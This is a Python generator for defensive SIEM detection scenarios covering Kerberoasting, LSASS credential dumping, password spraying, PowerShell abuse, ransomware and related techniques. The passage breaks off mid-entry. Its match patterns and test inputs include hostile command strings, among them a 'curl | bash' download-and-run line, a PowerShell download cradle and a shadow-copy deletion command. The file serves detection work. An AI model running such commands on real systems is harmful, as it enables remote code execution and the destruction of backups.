#!/usr/bin/env python3
"""Builds detection-scenario-templates.json for SENTINEL MATRIX.

Scenarios are DEFENSIVE detection specifications consumed by the deterministic rule generator.
Each scenario names the data source, telemetry event IDs, defender-side field predicates,
aggregation, false-positive notes, tuning guidance, and validation test expectations.
Predicates describe what the SIEM monitors (fields/values in logs), not attacker payloads.
"""
import json, os, datetime
HERE = os.path.dirname(os.path.abspath(__file__))

def eq(f, v): return {"field": f, "op": "in" if isinstance(v, list) else "eq", "value": v}
def ne(f, v): return {"field": f, "op": "ne", "value": v}
def contains(f, v): return {"field": f, "op": "contains_any" if isinstance(v, list) else "contains", "value": v}
def ends(f, v): return {"field": f, "op": "endswith_any" if isinstance(v, list) else "endswith", "value": v}
def notin(f, v): return {"field": f, "op": "not_in", "value": v}
def gt(f, v): return {"field": f, "op": "gt", "value": v}
def AGG(fn, by, thr, win, **extra): return dict(fn=fn, group_by=by, threshold=thr, window_minutes=win, **extra)
def TEST(name, inp, exp): return {"name": name, "input": inp, "expected": exp}
def S(sid, name, objective, logic_type, severity="medium", keywords=None, event_ids=None, log_source_types=None,
      selection=None, exclusions=None, agg=None, fp=None, tuning=None, tests=None):
    return {"id": sid, "name": name, "objective": objective, "logic_type": logic_type, "severity": severity,
            "keywords": keywords or [], "event_ids": event_ids or [], "log_source_types": log_source_types or [],
            "selection": selection or [], "exclusions": exclusions or [], "agg": agg,
            "fp": fp or [], "tuning": tuning or [], "tests": tests or []}

WS=["windows_security"]; SY=["sysmon","edr"]; PS=["powershell"]; DC=["active_directory","windows_security"]
LX=["linux_auditd"]; NET=["firewall","proxy","netflow"]; DNS=["dns"]; ID=["identity"]; CL=["cloud_audit"]

KB = {}

KB["T1558.003"] = {"name":"Kerberoasting","scenarios":[
 S("KRB-01","Abnormal service ticket request volume","Detect a single account requesting an unusually high number of Kerberos service tickets (TGS) in a short window.","threshold","high",
   ["4769","service ticket","kerberoast"],[4769],DC,
   [eq("EventID",4769),ne("ServiceName","krbtgt"),notin("ServiceName",["*$"])],[],
   AGG("count",["TargetUserName"],10,5,distinct="ServiceName"),
   ["Service/monitoring accounts that enumerate many SPNs","Backup software authenticating to many services at startup"],
   ["Baseline per-user distinct SPN counts over 30 days before setting the threshold","Exclude known scanner/monitoring accounts via a reference set"],
   [TEST("10 distinct SPNs from one user in 2 minutes",{"EventID":4769,"TargetUserName":"jdoe@CORP","distinct_ServiceName":10,"window_minutes":2},"match"),
    TEST("Normal user requesting 2 tickets",{"EventID":4769,"TargetUserName":"asmith@CORP","distinct_ServiceName":2,"window_minutes":5},"no_match")]),
 S("KRB-02","Weak encryption-type service ticket (RC4) for SPN accounts","Detect TGS requests using RC4-HMAC (0x17) for service accounts that normally use AES.","correlation","high",
   ["0x17","rc4","TicketEncryptionType"],[4769],DC,
   [eq("EventID",4769),eq("TicketEncryptionType","0x17"),ne("ServiceName","krbtgt"),notin("ServiceName",["*$"])],[],None,
   ["Legacy applications hard-coded to RC4","Accounts without AES keys set (msDS-SupportedEncryptionTypes)"],
   ["Inventory accounts lacking AES keys and remediate; exclude temporarily via a reference set","Correlate with KRB-01 for higher confidence"],
   [TEST("RC4 TGS for SPN account",{"EventID":4769,"TicketEncryptionType":"0x17","ServiceName":"svc_sql"},"match"),
    TEST("AES TGS",{"EventID":4769,"TicketEncryptionType":"0x12","ServiceName":"svc_sql"},"no_match")]),
 S("KRB-03","Service ticket requests from an unusual source host","Detect TGS requests for a service account from a host not previously seen requesting that SPN.","baseline","medium",
   ["IpAddress","unusual host","new source"],[4769],DC,
   [eq("EventID",4769),ne("ServiceName","krbtgt")],[],AGG("new_value",["ServiceName"],1,1440,observe="IpAddress",baseline_days=30),
   ["DHCP churn in user VLANs","Newly onboarded servers"],
   ["Key the baseline on hostname rather than IP where DHCP is in use","Scope to high-value SPNs (SQL, Exchange, ADFS) first"],
   [TEST("New client IP for an SPN",{"EventID":4769,"ServiceName":"svc_sql","IpAddress":"10.44.9.12","baseline_seen":False},"match")]),
 S("KRB-04","Honeytoken SPN requested","Detect any TGS request for a decoy service account that no legitimate client should ever use.","entity","critical",
   ["honey","decoy","canary"],[4769],DC,
   [eq("EventID",4769),eq("ServiceName",["svc_honey_sql","svc_decoy_backup"])],[],None,
   ["Vulnerability scanners that enumerate every SPN (exclude scanner accounts)"],
   ["Maintain the decoy SPN list in a reference set","Make the decoy accounts realistic (old password, descriptive name)"],
   [TEST("Decoy SPN requested",{"EventID":4769,"ServiceName":"svc_honey_sql"},"match"),
    TEST("Real SPN requested",{"EventID":4769,"ServiceName":"svc_sql"},"no_match")]),
 S("KRB-05","Kerberoasting tooling indicator on endpoint","Flag process-creation / script-block telemetry whose command text contains known roasting tool indicators.","process","high",
   ["kerberoast","getuserspns","rubeus"],[4688,1,4104],SY+PS,
   [contains("CommandLine",["kerberoast","getuserspns","requestorsecuritytoken"])],[contains("CommandLine",["klist"])],None,
   ["Authorised red-team/purple-team exercises (coordinate via change record)"],
   ["Also evaluate PowerShell ScriptBlock (EID 4104) text","Add EDR hashes of known tooling"],
   [TEST("Roasting tool indicator present",{"EventID":1,"CommandLine":"... kerberoast /outfile:..."},"match"),
    TEST("Benign klist",{"EventID":1,"CommandLine":"klist tickets"},"no_match")]),
 S("KRB-06","Privileged or dormant account requesting service tickets","Detect TGS requests by accounts in a privileged or dormant reference set.","entity","medium",
   ["privileged","dormant","domain admin"],[4769],DC,
   [eq("EventID",4769),ne("ServiceName","krbtgt")],[],AGG("count",["TargetUserName"],3,10,reference_set="Privileged or Dormant Accounts"),
   ["Administrators performing scheduled maintenance"],
   ["Populate the reference set from AD group membership and lastLogon exports","Lower the threshold to 1 for dormant accounts"],
   [TEST("Dormant account requests 3 tickets",{"EventID":4769,"TargetUserName":"old_contractor","in_reference_set":True,"count":3},"match")]),
 S("KRB-07","Identity + endpoint correlation: TGS burst then credential tooling","Correlate a TGS burst with LSASS access or offline-cracking tooling on the same host within 30 minutes.","multi_source","critical",
   ["correlation","sequence","multi-source"],[4769,10,1],DC+SY,
   [eq("EventID",4769)],[],AGG("sequence",["IpAddress"],2,30,steps=["KRB-01 fires for the source IP","On the same host: LSASS-01 fires, or process telemetry shows an offline-cracking tool"]),
   ["Rare; investigate every hit"],
   ["Requires asset-to-IP resolution between DC logs and endpoint telemetry"],
   [TEST("Burst then cracking tool on same host",{"step1":{"EventID":4769,"IpAddress":"10.1.2.3","count":12},"step2":{"EventID":1,"Computer":"WS-1023","indicator":"offline_cracker"},"within_minutes":12},"match")]),
 S("KRB-08","Baseline deviation in daily service-ticket volume per account","Per-account daily TGS count exceeds mean + 3σ of its 30-day baseline.","statistical","medium",
   ["baseline","deviation","anomaly"],[4769],DC,
   [eq("EventID",4769)],[],AGG("zscore",["TargetUserName"],3,1440,baseline_days=30,metric="count"),
   ["Patch Tuesday / mass restarts","New application rollouts"],
   ["Use median absolute deviation for robustness","Suppress on change-freeze calendar days"],
   [TEST("300 today vs baseline 20±5",{"TargetUserName":"jdoe","today":300,"mean":20,"stdev":5},"match"),
    TEST("Within baseline",{"TargetUserName":"jdoe","today":28,"mean":20,"stdev":5},"no_match")])]}

KB["T1558.004"] = {"name":"AS-REP Roasting","scenarios":[
 S("ASREP-01","TGT request without pre-authentication","Detect AS-REQ (4768) with PreAuthType 0, indicating accounts flagged DONT_REQ_PREAUTH.","process","high",
   ["4768","pre-authentication","preauth"],[4768],DC,
   [eq("EventID",4768),eq("PreAuthType","0"),eq("Status","0x0")],[],None,
   ["Legacy systems with pre-auth disabled by design"],
   ["Remediate DONT_REQ_PREAUTH flags; keep exceptions in a reference set"],
   [TEST("No-preauth TGT",{"EventID":4768,"PreAuthType":"0","Status":"0x0"},"match"),TEST("Normal TGT",{"EventID":4768,"PreAuthType":"2"},"no_match")]),
 S("ASREP-02","Many no-preauth TGT requests from one source","Threshold on 4768 PreAuthType 0 across many accounts from one IP (roastable-account enumeration).","threshold","high",
   ["4768","preauth","multiple accounts"],[4768],DC,
   [eq("EventID",4768),eq("PreAuthType","0")],[],AGG("count",["IpAddress"],5,10,distinct="TargetUserName"),
   ["Vulnerability scanners"],["Exclude scanner IPs via reference set"],
   [TEST("5 accounts from one IP",{"EventID":4768,"PreAuthType":"0","IpAddress":"10.1.1.9","distinct_users":5},"match")]),
 S("ASREP-03","DONT_REQ_PREAUTH flag enabled on an account","Detect UAC change (4738) enabling 'do not require Kerberos pre-authentication'.","state_change","high",
   ["4738","UserAccountControl","2096"],[4738],DC,
   [eq("EventID",4738),contains("UserAccountControl","2096")],[],None,
   ["Legitimate configuration of a legacy service account"],["Require change-ticket correlation"],
   [TEST("Flag enabled",{"EventID":4738,"UserAccountControl":"%%2096"},"match")])]}

KB["T1003.001"] = {"name":"LSASS Memory","scenarios":[
 S("LSASS-01","Suspicious process access to LSASS","Flag Sysmon EID 10 where a non-system process opens lsass.exe with memory-read access rights.","process","critical",
   ["lsass","ProcessAccess","GrantedAccess"],[10],SY,
   [eq("EventID",10),ends("TargetImage","\\lsass.exe"),eq("GrantedAccess",["0x1010","0x1410","0x1438","0x143a","0x1FFFFF","0x1F1FFF"])],
   [ends("SourceImage",["\\MsMpEng.exe","\\csrss.exe","\\wininit.exe","\\services.exe","\\taskmgr.exe"])],None,
   ["AV/EDR engines, backup agents, Task Manager, Process Explorer"],
   ["Tune exclusions per environment from a 30-day source-image inventory","Raise confidence when CallTrace contains UNKNOWN or dbghelp/dbgcore"],
   [TEST("Dumping utility opens lsass",{"EventID":10,"SourceImage":"C:\\tools\\util.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1FFFFF"},"match"),
    TEST("Defender access",{"EventID":10,"SourceImage":"...\\MsMpEng.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1FFFFF"},"no_match")]),
 S("LSASS-02","Credential-dump file created","Detect creation of a memory-dump file for lsass via Sysmon EID 11 / EDR file telemetry.","process","high",
   ["lsass","dmp","FileCreate"],[11],SY,
   [eq("EventID",11),contains("TargetFilename","lsass"),ends("TargetFilename",[".dmp"])],
   [ends("Image",["\\WerFault.exe"])],None,
   ["Windows Error Reporting dumps of a crashing lsass (creator WerFault.exe)"],
   ["Exclude WerFault.exe as the creating image"],
   [TEST("Dump file written",{"EventID":11,"TargetFilename":"C:\\temp\\lsass.dmp","Image":"C:\\tools\\util.exe"},"match")]),
 S("LSASS-03","Unsigned module loaded into LSASS","Detect a new DLL loaded into lsass.exe that is unsigned or not on a known-good list (Sysmon EID 7).","state_change","high",
   ["ImageLoaded","lsass","unsigned"],[7],SY,
   [eq("EventID",7),ends("Image","\\lsass.exe"),eq("Signed","false")],[],None,
   ["Third-party credential providers / smart-card middleware"],
   ["Build an allowlist of signed vendors legitimately loaded into lsass"],
   [TEST("Unsigned DLL in lsass",{"EventID":7,"Image":"...\\lsass.exe","Signed":"false"},"match")]),
 S("LSASS-04","Harvesting across multiple hosts by one account","Correlate LSASS-01 hits where one account touches lsass on 3+ hosts within an hour.","correlation","critical",
   ["multiple hosts","harvesting"],[10],SY,
   [eq("EventID",10),ends("TargetImage","\\lsass.exe")],[],AGG("count",["User"],3,60,distinct="Computer"),
   ["EDR deployment jobs run by a service account"],["Exclude security-tooling service accounts"],
   [TEST("One account, 3 hosts",{"EventID":10,"User":"adm1","distinct_Computer":3,"window_minutes":40},"match")])]}

KB["T1110.003"] = {"name":"Password Spraying","scenarios":[
 S("SPRAY-01","Many accounts failing auth from one source","Detect a single source producing failed logons (4625) against many distinct accounts in a short window.","threshold","high",
   ["4625","failed logon","spray"],[4625],WS,
   [eq("EventID",4625)],[],AGG("count",["IpAddress"],15,15,distinct="TargetUserName"),
   ["Misconfigured application or service with a stale password","NAT/VPN concentrator aggregating many users behind one IP"],
   ["Baseline failed-auth volume per source","Where many users share one egress IP, group by workstation instead"],
   [TEST("1 source, 20 accounts, 1 failure each",{"EventID":4625,"IpAddress":"10.2.2.2","distinct_users":20,"window_minutes":10},"match"),
    TEST("1 user fat-fingering password 5x",{"EventID":4625,"IpAddress":"10.2.2.2","distinct_users":1,"count":5},"no_match")]),
 S("SPRAY-02","Distributed spray against one account set","Low-and-slow: many sources, few attempts each, same target account set over hours.","statistical","medium",
   ["distributed","low and slow"],[4625],WS,
   [eq("EventID",4625)],[],AGG("count",["TargetUserName"],10,180,distinct="IpAddress"),
   ["Mail clients with cached bad credentials across devices"],
   ["Correlate with impossible-travel on any subsequent success"],
   [TEST("10 sources against one account over 2h",{"EventID":4625,"TargetUserName":"svc_app","distinct_ips":10,"window_minutes":120},"match")]),
 S("SPRAY-03","Cloud/identity-provider sign-in spray","Detect failed interactive/non-interactive sign-ins across many users from one ASN/IP in the IdP logs.","threshold","high",
   ["signin","identity","spray"],[],ID,
   [eq("ResultType",["50126","50053","50055"])],[],AGG("count",["IPAddress"],15,15,distinct="UserPrincipalName"),
   ["Corporate egress IP shared by many users","Legacy auth clients"],
   ["Block legacy auth; baseline per-IP user fan-out"],
   [TEST("One IP, many users, failures",{"ResultType":"50126","IPAddress":"20.1.1.1","distinct_users":25},"match")]),
 S("SPRAY-04","Spray followed by a success","Correlate a spray burst with a subsequent successful logon (4624) for one of the targeted accounts from the same source.","multi_source","critical",
   ["spray","success","4624"],[4625,4624],WS,
   [eq("EventID",4625)],[],AGG("sequence",["IpAddress"],2,30,steps=["SPRAY-01 fires for the source","4624 success for a targeted account from the same source"]),
   ["Rare; investigate every hit"],["Resolve source IP to asset for context"],
   [TEST("Spray then success",{"step1":"SPRAY-01","step2":{"EventID":4624,"IpAddress":"10.2.2.2"},"within_minutes":20},"match")])]}

KB["T1059.001"] = {"name":"PowerShell","scenarios":[
 S("PWSH-01","Encoded command execution","Flag PowerShell launched with an encoded-command switch in process/command telemetry.","process","high",
   ["powershell","encodedcommand","-enc"],[4688,1,4104],SY+PS,
   [contains("CommandLine",["-enc","-encodedcommand","-e "]),contains("Image",["powershell","pwsh"])],[],None,
   ["Some management agents legitimately use encoded commands"],
   ["Allowlist known management-agent parents/signers","Decode and inspect the payload where the SIEM supports it"],
   [TEST("Encoded command",{"EventID":1,"Image":"...powershell.exe","CommandLine":"powershell -enc SQBFAFgA..."},"match"),
    TEST("Normal cmdlet",{"EventID":1,"CommandLine":"powershell Get-Service"},"no_match")]),
 S("PWSH-02","Suspicious download/exec cradle in script block","Detect script-block logging (4104) text containing in-memory download-execute patterns.","process","high",
   ["4104","scriptblock","downloadstring","iex"],[4104],PS,
   [contains("ScriptBlockText",["downloadstring","downloadfile","invoke-expression","iex (","frombase64string","net.webclient"])],[],None,
   ["Legitimate admin scripts that fetch modules"],
   ["Allowlist signed internal scripts by path/hash","Combine with network egress to uncommon hosts"],
   [TEST("Download cradle",{"EventID":4104,"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://...')"},"match")]),
 S("PWSH-03","PowerShell spawned by Office application","Detect powershell/pwsh whose parent is an Office process.","process","high",
   ["parent","winword","excel","office"],[1,4688],SY,
   [contains("Image",["powershell","pwsh"]),ends("ParentImage",["\\winword.exe","\\excel.exe","\\powerpnt.exe","\\outlook.exe","\\mspub.exe"])],[],None,
   ["Rare legitimate macros in some enterprises"],
   ["Pair with ASR rule telemetry","Alert higher when combined with PWSH-01/02"],
   [TEST("Word spawns powershell",{"EventID":1,"Image":"...powershell.exe","ParentImage":"C:\\...\\WINWORD.EXE"},"match")]),
 S("PWSH-04","Downgrade to PowerShell v2","Detect use of -version 2 to evade script-block logging/AMSI.","process","medium",
   ["version 2","downgrade","v2"],[1,4688],SY,
   [contains("CommandLine",["-version 2","-v 2"]),contains("Image",["powershell"])],[],None,
   ["Legacy scripts pinned to v2"],["Remove the v2 engine where possible"],
   [TEST("v2 downgrade",{"EventID":1,"CommandLine":"powershell -version 2 -nop -w hidden ..."},"match")]),
 S("PWSH-05","Script-block logging disabled","Detect registry changes disabling PowerShell script-block/module logging.","state_change","high",
   ["4657","scriptblocklogging","registry"],[4657,13],WS+SY,
   [contains("ObjectName",["ScriptBlockLogging","ModuleLogging","Transcription"]),eq("EventID",[4657,13])],[],None,
   ["Legitimate GPO changes (correlate with change ticket)"],
   ["Protect logging GPOs; alert on any local override"],
   [TEST("Logging disabled",{"EventID":4657,"ObjectName":"...\\ScriptBlockLogging","NewValue":"0"},"match")])]}

KB["T1053.005"] = {"name":"Scheduled Task","scenarios":[
 S("SCHTASK-01","Scheduled task created","Detect task creation via 4698 or schtasks/New-ScheduledTask command telemetry.","process","medium",
   ["4698","schtasks","scheduled task"],[4698,1,4688],WS+SY,
   [eq("EventID",4698)],[],None,
   ["Software installers and management agents create tasks routinely"],
   ["Baseline task names/paths; alert on tasks whose action is a script host or lives in a temp/user path","Correlate creator process"],
   [TEST("Task created",{"EventID":4698,"TaskName":"\\Updater"},"match")]),
 S("SCHTASK-02","Task action runs a script host or temp binary","Detect created/updated tasks whose action command invokes a script interpreter or a binary in a user/temp directory.","process","high",
   ["action","temp","script host"],[4698,4702],WS,
   [eq("EventID",[4698,4702]),contains("TaskContent",["powershell","wscript","cscript","mshta","cmd /c","\\temp\\","\\appdata\\","\\public\\"])],[],None,
   ["Some legitimate deployment tasks use script hosts"],
   ["Allowlist signed management tooling","Pair with the creator-process context"],
   [TEST("Task runs from temp",{"EventID":4698,"TaskContent":"cmd /c C:\\Users\\Public\\x.bat"},"match")]),
 S("SCHTASK-03","Task created on a remote host","Detect task creation where the logon is a network/remote session — lateral persistence.","correlation","high",
   ["remote","network logon","lateral"],[4698,4624],WS,
   [eq("EventID",4698)],[],AGG("sequence",["Computer"],2,5,steps=["4624 LogonType 3 from a remote host","4698 task created shortly after on the same host"]),
   ["Remote admin tools that schedule maintenance"],["Scope to servers; exclude patch windows"],
   [TEST("Remote task creation",{"step1":{"EventID":4624,"LogonType":3},"step2":{"EventID":4698},"within_minutes":2},"match")])]}

KB["T1053.003"] = {"name":"Cron","scenarios":[
 S("CRON-01","New or modified cron entry","Detect auditd file writes to cron directories or crontab syscalls.","process","medium",
   ["cron","crontab","auditd"],[],LX,
   [contains("path",["/etc/cron","/var/spool/cron","/etc/crontab"]),eq("key",["cron","cron_persist"])],[],None,
   ["Package installs and config management (Ansible/Puppet) write cron entries"],
   ["Allowlist config-management users","Alert when the cron command references a script host or a world-writable path"],
   [TEST("Cron file written",{"key":"cron","path":"/etc/cron.d/x","syscall":"open"},"match")]),
 S("CRON-02","Cron entry invokes a network download or shell","Detect cron content that pipes a downloader to a shell or references /tmp.","process","high",
   ["cron","curl","wget","/tmp"],[],LX,
   [contains("proctitle",["curl","wget","/tmp/","bash -i","base64 -d"]),eq("key","cron")],[],None,
   ["Legitimate update jobs that fetch artifacts"],
   ["Allowlist known update endpoints"],
   [TEST("Cron downloads and runs",{"key":"cron","proctitle":"curl http://x | bash"},"match")])]}

KB["T1486"] = {"name":"Data Encrypted for Impact (Ransomware)","scenarios":[
 S("RANSOM-01","Mass file modification by one process","Detect a single process modifying/renaming a high volume of files across directories in a short window.","threshold","critical",
   ["mass","file modification","rename","ransom"],[11,2],SY,
   [eq("EventID",[11,2])],[],AGG("count",["Image"],200,5,distinct="TargetFilename"),
   ["Backup, indexing, sync and compression tools","Legitimate bulk file operations"],
   ["Allowlist backup/sync agents by signer","Weight higher when new file extensions appear across many directories"],
   [TEST("One process rewrites 500 files",{"EventID":11,"Image":"C:\\x.exe","distinct_files":500,"window_minutes":3},"match")]),
 S("RANSOM-02","Shadow copy / backup deletion","Detect commands or events that delete volume shadow copies or disable recovery.","process","critical",
   ["vssadmin","shadow","wbadmin","bcdedit","recovery"],[1,4688],SY,
   [contains("CommandLine",["shadows /all /quiet","delete shadows","delete catalog","recoveryenabled no","resize shadowstorage"])],[],None,
   ["Rare legitimate admin maintenance (require change ticket)"],
   ["Alert at high severity regardless; pair with RANSOM-01"],
   [TEST("Shadow copies deleted",{"EventID":1,"CommandLine":"vssadmin delete shadows /all /quiet"},"match")]),
 S("RANSOM-03","Ransom note written across shares","Detect creation of identically named files (e.g. readme/recover) in many directories.","threshold","high",
   ["ransom note","readme","recover"],[11],SY,
   [eq("EventID",11),contains("TargetFilename",["readme","recover","decrypt","how_to","restore"])],[],
   AGG("count",["TargetFilename_basename"],20,5,distinct="directory"),
   ["Documentation tools that scatter README files"],["Tune the basename keyword list to observed campaigns"],
   [TEST("Note in 30 directories",{"EventID":11,"TargetFilename_basename":"HOW_TO_DECRYPT.txt","distinct_directories":30},"match")]),
 S("RANSOM-04","New high-entropy extension appears en masse","Detect a surge of files gaining a new, uncommon extension.","statistical","high",
   ["extension","entropy","mass rename"],[11],SY,
   [eq("EventID",11)],[],AGG("new_value",["file_extension"],100,10,baseline_days=14),
   ["Legitimate new file formats from a new application"],["Baseline extensions per file server"],
   [TEST("100 files gain .locked",{"EventID":11,"file_extension":".locked","count":100,"baseline_seen":False},"match")])]}

KB["T1021.001"] = {"name":"Remote Desktop Protocol","scenarios":[
 S("RDP-01","RDP logon from an unusual source","Detect LogonType 10 (4624) from a source not in the baseline for that destination.","baseline","medium",
   ["3389","logontype 10","rdp"],[4624],WS,
   [eq("EventID",4624),eq("LogonType","10")],[],AGG("new_value",["Computer"],1,1440,observe="IpAddress",baseline_days=30),
   ["Jump hosts and admin bastions (allowlist)"],
   ["Restrict RDP to bastions; baseline per destination"],
   [TEST("RDP from new source",{"EventID":4624,"LogonType":10,"IpAddress":"10.9.9.9","baseline_seen":False},"match")]),
 S("RDP-02","Internet-facing or cross-zone RDP","Detect RDP connections crossing from a lower-trust to a higher-trust zone.","correlation","high",
   ["rdp","zone","cross-zone"],[4624],WS+NET,
   [eq("EventID",4624),eq("LogonType","10")],[],None,
   ["Approved cross-zone admin paths (allowlist by source)"],
   ["Map source IP to zone via the asset inventory","Alert when source zone is DMZ/User LAN and destination is Server/DC zone"],
   [TEST("RDP DMZ->DC",{"EventID":4624,"LogonType":10,"src_zone":"DMZ","dst_zone":"Domain Controller Zone"},"match")]),
 S("RDP-03","RDP brute force then success","Correlate repeated 4625 LogonType 10 failures with a subsequent 4624 success from the same source.","multi_source","high",
   ["rdp","brute force","success"],[4625,4624],WS,
   [eq("EventID",4625),eq("LogonType","10")],[],AGG("sequence",["IpAddress"],2,30,steps=["\u226510 RDP failures from one source","4624 LogonType 10 success from the same source"]),
   ["A user repeatedly mistyping then succeeding"],["Raise the failure threshold to reduce noise"],
   [TEST("Failures then success",{"step1":{"EventID":4625,"LogonType":10,"count":15},"step2":{"EventID":4624,"LogonType":10},"within_minutes":10},"match")])]}

KB["T1071.004"] = {"name":"DNS (C2)","scenarios":[
 S("DNSC2-01","High-volume DNS to a single domain","Detect a host issuing an abnormal number of queries to one registrable domain.","threshold","medium",
   ["dns","beacon","tunnel"],[22],DNS+SY,
   [eq("EventID",22)],[],AGG("count",["src_host"],500,10,distinct="query_subdomain",group2="registrable_domain"),
   ["CDNs, telemetry and software-update domains"],
   ["Allowlist high-volume legitimate domains","Combine with long average query length"],
   [TEST("1000 subdomains of one domain in 10m",{"EventID":22,"src_host":"WS-1","registrable_domain":"x.example","distinct_subdomains":1000},"match")]),
 S("DNSC2-02","Long or high-entropy DNS labels","Detect queries whose labels are unusually long or random, suggesting encoded tunneling.","statistical","medium",
   ["dns","entropy","long label","tunnel"],[22],DNS,
   [{"field":"query_length","op":"gt","value":52}],[],None,
   ["Some cloud services use long hostnames","DKIM/antivirus lookups"],
   ["Score on Shannon entropy of the leftmost label","Allowlist known long-label services"],
   [TEST("Long random label",{"EventID":22,"query":"a8f3k...long.example","query_length":80},"match")]),
 S("DNSC2-03","DNS to a newly observed / low-reputation domain","Detect queries to registrable domains first seen in the environment within N days.","baseline","medium",
   ["dns","new domain","rare"],[22],DNS,
   [eq("EventID",22)],[],AGG("new_value",["registrable_domain"],1,43200,baseline_days=30),
   ["Normal browsing to new sites (scope to servers)"],
   ["Scope to server VLANs where new domains are rarer","Enrich with passive-DNS age if available"],
   [TEST("Server queries brand-new domain",{"EventID":22,"src_zone":"Server LAN","registrable_domain":"new.example","baseline_seen":False},"match")])]}

KB["T1562.001"] = {"name":"Disable or Modify Security Tools","scenarios":[
 S("DEFEVADE-01","Security service stopped or disabled","Detect service stop/disable or tamper events for EDR/AV/logging services.","state_change","high",
   ["7036","service stopped","defender","edr","tamper"],[7036,7040,4697,16],WS+SY,
   [contains("ServiceName",["Defender","Sense","CSFalcon","SentinelAgent","Sysmon","AMSI","wuauserv","WinDefend","SecurityHealthService"]),contains("message",["stopped","disabled"])],[],None,
   ["Approved maintenance or upgrades (require change ticket)"],
   ["Feed the protected-service list from the EDR inventory","Alert at high severity and auto-create an offense"],
   [TEST("EDR service stopped",{"EventID":7036,"ServiceName":"CSFalconService","message":"stopped"},"match")]),
 S("DEFEVADE-02","Defender real-time protection turned off","Detect registry/config or Defender operational events disabling real-time protection.","state_change","high",
   ["5001","realtime","disableantispyware","defender"],[5001,4657,13],WS+SY,
   [contains("ObjectName",["DisableRealtimeMonitoring","DisableAntiSpyware","DisableBehaviorMonitoring"]),eq("EventID",[5001,4657,13])],[],None,
   ["Legitimate GPO configuration (correlate change ticket)"],
   ["Protect the Defender policy keys; alert on local overrides"],
   [TEST("RTP disabled",{"EventID":5001},"match")]),
 S("DEFEVADE-03","Telemetry source goes silent","Detect a previously reporting log source that stops sending events — possible agent kill or collector block.","statistical","high",
   ["silent","log source","heartbeat","collector"],[],["siem_internal"],
   [],[],AGG("absence",["log_source_id"],1,60,baseline_days=7,expect_events=True),
   ["Host offline for legitimate reasons (patching, decommission)"],
   ["Cross-check the asset inventory for planned downtime","Scope to critical sources first"],
   [TEST("Critical source silent 60m",{"log_source_id":"dc01-sec","expected":True,"seen":False,"window_minutes":60},"match")])]}

KB["T1136.002"] = {"name":"Create Account: Domain Account","scenarios":[
 S("ACCT-01","Domain account created","Detect 4720 user-account creation on a domain controller.","process","medium",
   ["4720","account created"],[4720],DC,
   [eq("EventID",4720)],[],None,
   ["Normal joiner/mover/leaver provisioning by IAM"],
   ["Allowlist IAM service accounts as the creator (SubjectUserName)","Alert when created by a non-IAM account"],
   [TEST("Account created by non-IAM user",{"EventID":4720,"SubjectUserName":"jdoe"},"match")]),
 S("ACCT-02","New account added to a privileged group","Correlate account creation (4720) with addition to a privileged group (4728/4732/4756) shortly after.","correlation","high",
   ["4720","4728","privileged group","domain admins"],[4720,4728,4732,4756],DC,
   [eq("EventID",[4728,4732,4756]),contains("GroupName",["Admins","Administrators","Operators"])],[],
   AGG("sequence",["TargetUserName"],2,60,steps=["4720 account created","same account added to a privileged group within 60 minutes"]),
   ["Legitimate privileged provisioning (correlate change ticket)"],
   ["Maintain the privileged-group watchlist","Alert at high severity"],
   [TEST("Create then add to Domain Admins",{"step1":{"EventID":4720,"TargetUserName":"svc_new"},"step2":{"EventID":4728,"GroupName":"Domain Admins","MemberName":"svc_new"},"within_minutes":5},"match")]),
 S("ACCT-03","Account created outside business hours","Detect 4720 occurring outside the organisation's change window.","time_based","medium",
   ["4720","off hours","after hours"],[4720],DC,
   [eq("EventID",4720)],[],AGG("time_window",["SubjectUserName"],1,0,outside_hours="18:00-07:00",weekends=True),
   ["Follow-the-sun IAM teams in other time zones"],
   ["Set the hours per the actual change calendar"],
   [TEST("Account created at 03:00",{"EventID":4720,"hour":3},"match")])]}

KB["T1087.002"] = {"name":"Account Discovery: Domain Account","scenarios":[
 S("RECON-01","AD enumeration tooling on an endpoint","Flag process/command telemetry matching known AD-recon tool indicators.","process","medium",
   ["bloodhound","sharphound","adfind","net group"],[1,4688,4104],SY+PS,
   [contains("CommandLine",["sharphound","invoke-bloodhound","adfind","get-netuser","get-domainuser","net group \"domain admins\""])],[],None,
   ["Administrators and auditors running legitimate directory queries"],
   ["Allowlist admin workstations/accounts","Raise confidence on collection-style flags"],
   [TEST("Recon tool indicator",{"EventID":1,"CommandLine":"... -CollectionMethod All"},"match")]),
 S("RECON-02","Directory enumeration burst via LDAP","Detect a host performing a burst of directory-object reads (4662) across many objects.","threshold","medium",
   ["4662","ldap","enumeration"],[4662],DC,
   [eq("EventID",4662)],[],AGG("count",["SubjectUserName"],300,10,distinct="ObjectName"),
   ["Directory-sync and IAM reconciliation jobs"],
   ["Allowlist sync service accounts","Baseline per-account object-read volume"],
   [TEST("300 objects read in 10m",{"EventID":4662,"SubjectUserName":"jdoe","distinct_objects":300},"match")])]}

KB["T1550.002"] = {"name":"Pass the Hash","scenarios":[
 S("PTH-01","NTLM network logon with anomalous pattern","Detect LogonType 3 with NTLM (4624/4776) where the account normally uses Kerberos, from an unusual host.","correlation","high",
   ["ntlm","4776","logontype 3","pass the hash"],[4624,4776],WS,
   [eq("EventID",4624),eq("LogonType","3"),eq("AuthenticationPackageName","NTLM")],[],
   AGG("new_value",["TargetUserName"],1,1440,observe="WorkstationName",baseline_days=30),
   ["Legacy apps that force NTLM","Non-domain-joined hosts"],
   ["Reduce NTLM usage; baseline per-account NTLM hosts","Correlate with LSASS-01 on the source"],
   [TEST("NTLM from new workstation",{"EventID":4624,"LogonType":3,"AuthenticationPackageName":"NTLM","WorkstationName":"NEWHOST","baseline_seen":False},"match")]),
 S("PTH-02","Same account, many hosts, NTLM, short window","Detect one account authenticating via NTLM network logon to many hosts rapidly.","threshold","high",
   ["ntlm","lateral","many hosts"],[4624],WS,
   [eq("EventID",4624),eq("LogonType","3"),eq("AuthenticationPackageName","NTLM")],[],
   AGG("count",["TargetUserName"],10,10,distinct="Computer"),
   ["Scanners and management tools using one service account"],
   ["Exclude known management service accounts"],
   [TEST("One account, 15 hosts via NTLM in 10m",{"EventID":4624,"LogonType":3,"AuthenticationPackageName":"NTLM","distinct_Computer":15},"match")])]}

KB["T1190"] = {"name":"Exploit Public-Facing Application","scenarios":[
